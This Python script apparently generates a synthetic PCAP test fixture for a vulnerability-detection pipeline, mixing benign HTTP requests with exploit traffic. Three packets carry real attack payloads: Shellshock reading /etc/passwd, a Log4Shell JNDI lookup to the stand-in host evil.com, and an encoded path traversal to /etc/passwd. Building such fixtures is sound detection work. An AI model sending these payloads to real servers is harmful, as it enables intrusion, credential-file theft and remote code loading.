#!/usr/bin/env python3
"""Generate synthetic network traffic PCAP for vulnerability assessment pipeline.

Creates a PCAP file containing a mix of normal HTTP traffic and requests
with exploit signatures matching known CVEs in the vulnerability database.
"""
import struct
import socket


def ip_checksum(header):
    """Compute IP header checksum per RFC 791."""
    if len(header) % 2:
        header += b'\x00'
    total = 0
    for i in range(0, len(header), 2):
        total += struct.unpack('!H', header[i:i+2])[0]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def make_packet(src_ip, dst_ip, src_port, dst_port, payload, pkt_id=1):
    """Create an Ethernet + IPv4 + TCP packet with given payload."""
    payload_bytes = payload.encode('ascii') if isinstance(payload, str) else payload

    # Ethernet header (14 bytes)
    eth = struct.pack('!6s6sH',
        b'\x00\x0c\x29\x1a\x2b\x3c',  # dst mac
        b'\x00\x0c\x29\x4d\x5e\x6f',  # src mac
        0x0800                          # EtherType: IPv4
    )

    # TCP header (20 bytes, no options)
    tcp = struct.pack('!HHIIHHHH',
        src_port, dst_port,
        1000 + pkt_id * 1000, 1,       # seq, ack
        0x5018,                         # data offset=5, flags=PSH+ACK
        65535,                          # window size
        0,                              # checksum (not computed)
        0                               # urgent pointer
    )

    # IP header (20 bytes)
    ip_total_len = 20 + 20 + len(payload_bytes)
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
        0x45, 0x00,                     # version/IHL, DSCP/ECN
        ip_total_len, pkt_id,           # total length, identification
        0x4000,                         # flags (DF), fragment offset
        64, 6,                          # TTL, protocol (TCP)
        0,                              # checksum placeholder
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip)
    )
    chk = ip_checksum(ip_hdr)
    ip_hdr = ip_hdr[:10] + struct.pack('!H', chk) + ip_hdr[12:]

    return eth + ip_hdr + tcp + payload_bytes


def write_pcap(filename, packets):
    """Write packets to a PCAP file (libpcap format)."""
    with open(filename, 'wb') as f:
        # Global header
        f.write(struct.pack('<IHHiIII',
            0xa1b2c3d4,    # magic number
            2, 4,          # version major, minor
            0, 0,          # timezone, sigfigs
            65535,          # snap length
            1               # link-layer type: LINKTYPE_ETHERNET
        ))

        for idx, pkt_data in enumerate(packets):
            ts_sec = 1700000000 + idx * 3
            ts_usec = idx * 100000
            f.write(struct.pack('<IIII',
                ts_sec, ts_usec,
                len(pkt_data), len(pkt_data)
            ))
            f.write(pkt_data)


# --- Build packet list ---
packets = []

# Packet 1: Normal HTTP GET (benign traffic)
packets.append(make_packet('10.0.1.50', '10.0.1.10', 49152, 80,
    "GET /index.html HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    "Accept: text/html\r\n\r\n",
    pkt_id=1))

# Packet 2: Shellshock exploit (CVE-2014-6271) in User-Agent header
packets.append(make_packet('10.0.1.100', '10.0.1.10', 49200, 80,
    "GET /cgi-bin/status HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'\r\n"
    "Accept: */*\r\n\r\n",
    pkt_id=2))

# Packet 3: Normal HTTP GET (benign traffic)
packets.append(make_packet('10.0.1.51', '10.0.1.10', 49153, 80,
    "GET /api/health HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "User-Agent: curl/7.68.0\r\n"
    "Accept: */*\r\n\r\n",
    pkt_id=3))

# Packet 4: Log4Shell exploit (CVE-2021-44228) in X-Api-Token header, port 8080
packets.append(make_packet('10.0.1.100', '10.0.1.20', 49201, 8080,
    "GET /api/v1/login HTTP/1.1\r\n"
    "Host: app.internal:8080\r\n"
    "User-Agent: python-requests/2.28.0\r\n"
    "X-Api-Token: ${jndi:ldap://evil.com/exploit}\r\n"
    "Accept: application/json\r\n\r\n",
    pkt_id=4))

# Packet 5: Normal HTTP POST (benign traffic)
packets.append(make_packet('10.0.1.52', '10.0.1.10', 49154, 80,
    "POST /api/data HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 15\r\n\r\n"
    '{"status":"ok"}',
    pkt_id=5))

# Packet 6: Path traversal exploit (CVE-2021-41773) with encoded dots
packets.append(make_packet('10.0.1.100', '10.0.1.30', 49202, 80,
    "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "User-Agent: curl/7.68.0\r\n"
    "Accept: */*\r\n\r\n",
    pkt_id=6))

# Packet 7: Normal HTTPS traffic (benign, to port 443)
packets.append(make_packet('10.0.1.53', '10.0.1.10', 49155, 443,
    "GET /secure/dashboard HTTP/1.1\r\n"
    "Host: secure.internal\r\n"
    "User-Agent: Mozilla/5.0\r\n\r\n",
    pkt_id=7))

# Packet 8: Normal HTTP GET (benign monitoring traffic)
packets.append(make_packet('10.0.1.54', '10.0.1.10', 49156, 80,
    "GET /api/version HTTP/1.1\r\n"
    "Host: web.internal\r\n"
    "User-Agent: monitoring-agent/1.0\r\n"
    "Accept: application/json\r\n\r\n",
    pkt_id=8))

write_pcap('/app/traffic.pcap', packets)
print(f"[+] Generated traffic.pcap with {len(packets)} packets")
